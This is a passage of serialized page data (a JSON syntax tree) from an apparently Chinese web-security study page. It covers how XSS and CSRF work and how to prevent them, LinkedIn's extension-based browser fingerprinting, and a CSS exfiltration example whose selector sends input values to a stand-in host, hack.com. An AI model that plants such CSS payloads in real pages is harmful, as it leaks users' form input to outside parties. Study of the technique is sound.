10},"root",[181,189,204,209,216,222,228,233,239,244,250,255,260,266,279,296,301,307,404],{"type":182,"tag":183,"props":184,"children":186},"element","h2",{"id":185},"领域",[187],{"type":188,"value":185},"text",{"type":182,"tag":190,"props":191,"children":192},"ul",{},[193],{"type":182,"tag":194,"props":195,"children":196},"li",{},[197],{"type":182,"tag":198,"props":199,"children":201},"a",{"href":200},"/maps/_web/browser-api/crypto",[202],{"type":188,"value":203},"Web Crypto API",{"type":182,"tag":183,"props":205,"children":207},{"id":206},"概念",[208],{"type":188,"value":206},{"type":182,"tag":210,"props":211,"children":213},"h4",{"id":212},"xss-的原理是怎么样的",[214],{"type":188,"value":215},"XSS 的原理是怎么样的？",{"type":182,"tag":217,"props":218,"children":219},"p",{},[220],{"type":188,"value":221},"XSS（Cross Site Scripting）跨站脚本攻击，通过某种方式将非法代码挂载在 URL、或者后端数据中，以达到让浏览器执行的目的。反射型 XSS 和储存型 XSS 都是利用后端返回的非法脚本直接在前端展示，就得到了执行。DOM-Based XSS 是通过修改源码内容来执行的。比如说，反射型 XSS 可能是一封黑客的邮件，链接参数带上了脚本代码；储存型 XSS 在可视化编辑器中很常见；DOM-Based XSS 可能是执行了一段 URL Hash 里面拿到的文本。",{"type":182,"tag":210,"props":223,"children":225},{"id":224},"xss-有哪些危害怎么防范",[226],{"type":188,"value":227},"XSS 有哪些危害，怎么防范？",{"type":182,"tag":217,"props":229,"children":230},{},[231],{"type":188,"value":232},"XSS 可以用来盗取 Cookie、DDos、篡改数据等。防范最基本要做的就是是后端不应该信任前端传来的数据，并且要做好过滤，把字符转义为 HTML 实体。其次是给 Cookie 设上 http-only。",{"type":182,"tag":210,"props":234,"children":236},{"id":235},"csrf-攻击原理是怎么样的",[237],{"type":188,"value":238},"CSRF 攻击原理是怎么样的？",{"type":182,"tag":217,"props":240,"children":241},{},[242],{"type":188,"value":243},"CSRF（Cross Site Request Forgery）跨站请求伪造，主要原理是黑客利用了用户在敏感站点保持的登录态，在另一个用户访问的网页去伪造敏感站点的请求。",{"type":182,"tag":210,"props":245,"children":247},{"id":246},"csrf-怎么防范",[248],{"type":188,"value":249},"CSRF 怎么防范？",{"type":182,"tag":217,"props":251,"children":252},{},[253],{"type":188,"value":254},"可以使用 CSRF token 方案。每次用户请求 HTML 都在其中设置一个随机的 Token，在请求时带上。",{"type":182,"tag":183,"props":256,"children":258},{"id":257},"用户追踪技术",[259],{"type":188,"value":257},{"type":182,"tag":210,"props":261,"children":263},{"id":262},"linkedin-如何使用浏览器指纹追踪用户",[264],{"type":188,"value":265},"LinkedIn 如何使用浏览器指纹追踪用户？",{"type":182,"tag":217,"props":267,"children":268},{},[269,271,277],{"type":188,"value":270},"LinkedIn 被披露使用激进的\"用户指纹\"技术追踪用户：页面会加载一个包含 ",{"type":182,"tag":272,"props":273,"children":274},"strong",{},[275],{"type":188,"value":276},"2953 个浏览器插件",{"type":188,"value":278},"的清单，脚本依次检测用户安装了其中哪些插件，以此生成唯一特征码识别用户。这导致访问 LinkedIn 时控制台可能出现上千个报错。这种追踪方式比传统的 cookie 更隐蔽、更难防范，代表了当前网站用户追踪技术的极端案例。",{"type":182,"tag":280,"props":281,"children":282},"blockquote",{},[283],{"type":182,"tag":217,"props":284,"children":285},{},[286,288],{"type":188,"value":287},"#周刊摘录 见：",{"type":182,"tag":198,"props":289,"children":293},{"href":290,"rel":291},"https://www.ruanyifeng.com/blog/2026/02/weekly-issue-385.html",[292],"nofollow",[294],{"type":188,"value":295},"科技周刊第385期",{"type":182,"tag":183,"props":297,"children":299},{"id":298},"三剑客",[300],{"type":188,"value":298},{"type":182,"tag":210,"props":302,"children":304},{"id":303},"css-exfiltration-攻击原理是什么",[305],{"type":188,"value":306},"CSS Exfiltration 攻击原理是什么？",{"type":182,"tag":308,"props":309,"children":313},"pre",{"className":310,"code":311,"language":312,"meta":175,"style":175},"language-css shiki shiki-themes material-theme-lighter github-light github-dark monokai","input[value^=a]{\n  background-image: url(http://hack.com/a);\n}\n","css",[314],{"type":182,"tag":315,"props":316,"children":317},"code",{"__ignoreMap":175},[318,358,395],{"type":182,"tag":319,"props":320,"children":323},"span",{"class":321,"line":322},"line",1,[324,330,336,342,348,353],{"type":182,"tag":319,"props":325,"children":327},{"style":326},"--shiki-light:#E2931D;--shiki-default:#22863A;--shiki-dark:#85E89D;--shiki-sepia:#F92672",[328],{"type":188,"value":329},"input",{"type":182,"tag":319,"props":331,"children":333},{"style":332},"--shiki-light:#39ADB5;--shiki-default:#24292E;--shiki-dark:#E1E4E8;--shiki-sepia:#F8F